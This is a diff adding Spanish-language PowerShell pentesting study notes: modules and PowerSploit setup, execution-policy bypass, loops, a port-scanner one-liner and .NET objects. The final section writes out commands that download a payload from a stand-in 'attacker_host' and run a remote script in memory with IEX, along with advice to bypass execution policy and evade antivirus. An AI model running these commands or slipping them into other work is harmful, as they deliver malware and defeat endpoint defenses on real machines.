@@ -79,6 +79,75 @@ PS C:\> ls -r C:\users\user\Documents -File .txt | % { sls -Path $_ -Pattern pas
 PS C:\> Get-Service
 PS C:\> Get-Service “s*” | Sort-Object Status -Descending
 
+# PowerShell Modules
+
+- Archivo .psm1 que agrupa funcionalidades de PS en un solo archivo reutilizable.
+- Tipos: Script Modules (.psm1), Binary Modules, Manifest Modules, Dynamic Modules.
+
+PS C:\> Get-Module                    # listar módulos importados en la sesión actual
+PS C:\> Get-Module -ListAvailable     # listar todos los módulos disponibles para importar
+PS C:\> Import-Module .\module.psm1   # importar un módulo desde ruta local
+PS C:\> Import-Module PowerSploit     # importar módulo por nombre (si está en PSModulePath)
+PS C:\> $Env:PSModulePath             # ver rutas donde PS busca módulos
+PS C:\> Get-Command -Module PowerSploit  # listar todos los cmdlets de un módulo importado
+PS C:\> Get-Help Write-HijackDLL      # obtener ayuda de un cmdlet específico del módulo
+
+# PowerSploit — framework ofensivo en PS
+# Repo: https://github.com/PowerShellMafia/PowerSploit
+# Instalar: descargar .zip → extraer → copiar carpeta a:
+# C:\Users\user\Documents\WindowsPowerShell\Modules\PowerSploit\
+# Nota: el AV lo va a detectar → crear exclusión de directorio antes de descargar
+
+---
+
+# PowerShell Scripts
+
+# .ps1 = script de PowerShell (el "1" es el motor, no la versión)
+PS C:\> .\script.ps1                          # ejecutar script en directorio actual
+PS C:\> powershell.exe -ExecutionPolicy Bypass .\script.ps1  # bypass si hay restricción
+
+PS C:\> $file = "users.txt"
+PS C:\> Get-Content $file                     # alternativa rápida sin escribir .ps1
+
+# Loop Statements — iterar colecciones, archivos, puertos, etc.
+PS C:\> Get-Help about_Foreach
+PS C:\> Get-Help about_For
+PS C:\> Get-Help about_While
+PS C:\> Get-Help about_Do
+
+# foreach — iterar una colección de objetos
+PS C:\> $services = Get-Service
+PS C:\> foreach ($service in $services) { $service.Name }
+
+# ForEach-Object — equivalente con pipeline (% es alias)
+PS C:\> Get-Service | ForEach-Object { $_.Name }
+PS C:\> Get-Service | % { $_.Name }           # forma corta con alias
+
+# Where-Object — filtrar objetos por propiedad
+PS C:\> Get-ChildItem C:\PowerShell\ | Where-Object { $_.Name -match "xls" }
+
+# TCP Port Scanner one-liner
+PS C:\> $ports=(80,443,8080); $ip="192.168.1.1"; foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient($ip,$port); } catch {}; if ($socket -eq $null) { echo "$ip:$port - Closed" } else { echo "$ip:$port - Open"; $socket = $null } }
+
+---
+
+# PowerShell Objects
+
+# Los cmdlets devuelven objetos .NET, no texto plano → se pueden filtrar por propiedades y manipular con métodos.
+
+PS C:\> Get-Process | Get-Member -MemberType Method   # ver métodos disponibles de un objeto
+PS C:\> Get-Process -Name "firefox" | Kill            # llamar método Kill sobre el objeto proceso
+
+# Crear objetos .NET con New-Object — muy útil para descargas y conexiones
+PS C:\> $webclient = New-Object System.Net.WebClient
+PS C:\> $payload_url = "https://attacker_host/payload.exe"
+PS C:\> $file = "C:\ProgramData\payload.exe"
+PS C:\> $webclient.DownloadFile($payload_url, $file)   # descargar payload a disco
+
+# Alternativa más corta con IEX (Invoke-Expression) — ejecuta en memoria sin tocar disco
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://attacker_host/script.ps1')
+# ↑ Importante para evasión de AV: nunca escribe el script en disco
+
 ```
 ### ~ PowerShell for Pentesting
 
